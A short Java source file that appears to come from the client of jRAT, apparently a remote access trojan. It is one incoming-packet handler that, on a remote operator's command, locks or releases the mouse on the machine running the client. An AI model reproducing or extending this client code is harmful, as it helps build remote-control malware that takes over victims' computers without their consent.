package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.MouseLock;

public class Packet27ToggleMouseLock implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean enabled = con.readBoolean();

		if (enabled) {
			int monitor = con.readInt();

			MouseLock.start(monitor);
		} else {
			MouseLock.stopRunning();
		}
	}

}
